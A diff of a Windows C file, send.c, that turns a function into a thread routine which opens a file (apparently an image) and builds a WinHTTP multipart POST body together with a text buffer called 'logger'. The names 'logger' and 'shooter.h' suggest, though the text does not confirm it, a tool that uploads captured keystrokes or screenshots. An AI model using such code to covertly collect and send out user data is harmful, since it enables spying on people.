@@ -1,14 +1,24 @@
+// send.c: send post request asynchronously
+// This part of this program is heavily based of https://learn.microsoft.com/en-us/windows/win32/procthread/creating-threads this example
+// Understand that example before attempting to edit this code
+
 #include <windows.h>
 #include "C:\Users\ASUS\Downloads\mingw-w64-v11.0.0\mingw-w64-v11.0.0\mingw-w64-headers\include\winhttp.h"
 #include <stdio.h>
+#include "shooter.h"
 
 #pragma comment(lib, "winhttp.lib")
 
-const char boundary[] = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
+const char boundary[] = "----WebKitFormBoundary7MA4YWxkTrZu0gW";    // way to split our data 
 
 
-int xender(const char *filename, char logger[])
+//int xender(const char *filename, char logger[])     // function for thread to call
+DWORD WINAPI Xend(LPVOID param)     // function for thread to call
 {
+    // make pointer for function to use
+    // this function expects pointers to the param and create thread accepted this fgucntion with LPVOID
+    // this is void, we cannot derefence void pointers. we first have to cast to our custom datatype
+    DataToSend* data = (DataToSend*)param;
         // start session
     //https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopen
     HINTERNET hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0", 
@@ -47,7 +57,7 @@ int xender(const char *filename, char logger[])
 
 
 
-        FILE *outfile = fopen(filename, "rb");   
+        FILE *outfile = fopen(data->filename, "rb");   
         if(!outfile)
         {
             printf("Cannot load image");
@@ -72,7 +82,7 @@ int xender(const char *filename, char logger[])
 
 
     // Prepare the multipart body
-    const char* text = logger;
+    const char* text = data->logger;
     size_t textLength = strlen(text) + 1; // Example text
     size_t totalLength = strlen(boundary) * 2 + textLength + fileSize + 1000; // Additional space for headers and boundaries
 
